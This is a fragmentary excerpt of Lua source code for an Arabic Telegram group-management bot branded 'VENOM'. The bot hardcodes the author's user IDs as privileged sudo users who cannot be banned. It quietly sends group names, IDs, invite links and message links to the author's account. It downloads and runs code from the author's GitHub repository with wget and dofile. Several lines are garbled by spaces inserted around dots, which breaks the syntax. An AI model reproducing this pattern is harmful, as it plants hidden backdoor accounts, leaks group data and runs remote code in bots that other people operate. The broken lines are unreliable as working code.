...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/V5D5X/V5D5X/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1785825545,1891876420,1860114886,1897501388}   
...
if tonumber(user_id) == tonumber(1785825545) then  
var = true 
elseif tonumber(user_id) == tonumber(1860114886) then
var = true  
elseif tonumber(user_id) == tonumber(1897501388) then
var = true  
elseif tonumber(user_id) == tonumber(1891876420) then
var = true  
...
local Namebot = (bot_data:get(ban_id..'Name:Bot') or 'ايرور') 
local VENOM_Msg = { 
...
os.execute('wget https://raw.githubusercontent.com/V5D5X/V5D5X/main/VENOM.lua')
...
send(msg.chat_id_, msg.id_,' ● اصدار سورس ايرور{ S:1✓}')
end
...
send(msg.chat_id_, msg.id_,'هذا الامر خاص بي روبوت فقط')
return false
end
local msg_id = msg.id_/2097152/0.5 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '˹ʙᴀɴᴅᴀ➧ᴏғғʟɪɴᴇ˼', url="t.me/Q_o_ll"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
bot_data:del(ban_id..'Srt:Bot') 
local Text = [[ 
 ● من أحسن السورسات على التليجرام سورس ايرور ●
...
if text and text:match("^روبوت$") or text and text:match("^Banda$") or text and text:match("^banda$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
...
sendText(1785825545,"●. هناك شخص يريدك يا سيدي روبوت \n●الشخص  {"..Name.."}\n●اسم الجروب {"..NameChat.."}\n●ايدي الجروب { `"..msg.chat_id_.."` }\n●رابط الجروب \n [ "..LinkGroup.." ]\n    ●رابط الرساله \n https://t.me/c/"..chatid.."/"..msg_id.."   ",0,'md')
end,nil)
end,nil)
end
...
sendText(1891876420,"●. هناك شخص يريدك يا سيدي  ديفيد \n●الشخص  {"..Name.."}\n●اسم الجروب {"..NameChat.."}\n●ايدي الجروب {`"..msg.chat_id_.."`}\n●رابط الجروب \n ["..LinkGroup.."] ",0,'md')
end,nil)
end,nil)
end
...
print("it is Bot")
N = (bot_data:get(ban_id.."Name:Bot") or "ايرور")
...
local msg_id = msg . id_/2097152/0 . 5
https . request("https://api . telegram . org/bot"  . . token  . . '/sendPhoto?chat_id='  . . msg . chat_id_  . . '&photo=https://t . me/'  . . user  . . '&caption='  . . URL . escape(bio)  . . "&reply_to_message_id="  . . msg_id  . . "&parse_mode=markdown&disable_web_page_preview=true&reply_markup="  . . JSON . encode(keyboard)) 
end
if text == 'ييوسف' or text == 'يوسف' or text == 'روبت' then
local id = '1860114886'
local urrl = https . request('https://api . telegram . org/bot'  . . tokenget  . . '/getchat?chat_id='  . . id)
local json = JSON . decode(urrl)
local name = json . result . first_name
...
if text == 'روبوت' or text == 'Banda' or text == 'banda' then
local Text = [[
ᴘʀᴏɢʀᴀᴍᴍᴇʀ ᴘᴀɴᴅᴀ
...
if text == 'العاب ايرور' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
...
if tonumber(result.sender_user_id_) == tonumber(1891876420) then  
send(msg.chat_id_, msg.id_, " ● لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if result.id_ == tonumber(1891876420) then
send(msg.chat_id_, msg.id_, " ?? لا يمكنك حظر مبرمج السورس \n")
return false 
end
...
if tonumber(userid) == tonumber(1891876420) then  
send(msg.chat_id_, msg.id_, " ● لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if Devban(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/V5D5X/V5D5X/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ● اهلا بك في متجر ملفات ايرور\n ● ملفات السورس ↓\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
...
local json_file, res = https.request("https://raw.githubusercontent.com/V5D5X/V5D5X/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('VENOM.lua')  
else
send(msg.chat_id_, msg.id_," ● عذرا الملف لايدعم سورس ايرور\n") 
end
return false
end
...
if text == ""..(bot_data:get(ban_id..'Name:Bot') or 'ايرور').."" then  
Namebot = (bot_data:get(ban_id..'Name:Bot') or 'ايرور')
local VENOM_Msg = {
'ننعم يروحي 😻??',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
...
--------------
if text == ""..(bot_data:get(ban_id..'Name:Bot') or 'ايرور').." غادر" or text == 'غادر' and Sudo(msg) then     
...
{{text = 'تــواصــل بــانــدا',url="t.me/Quick0k"}}, 
...
keyboard.inline_keyboard = {
{{text = 'ՏΌႮᎡᏟᎬ ᏙᎬΝΌᎷ', url="t.me/SOURCEVENOM"}},
{{text = '˹تــواصــل الـسـورس˼',url="t.me/Quick0k"}}, 
{{text = '●𝙱𝙰𝙲𝙺↵', callback_data="/change-hhh"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
...
الاعمال الملائمة : أطباء، صيادلة، مدرايرور، أخصائيو تغذية، شيف، سماسرة
...
local Name_Bot = (bot_data:get(ban_id..'Name:Bot') or 'ايرور')
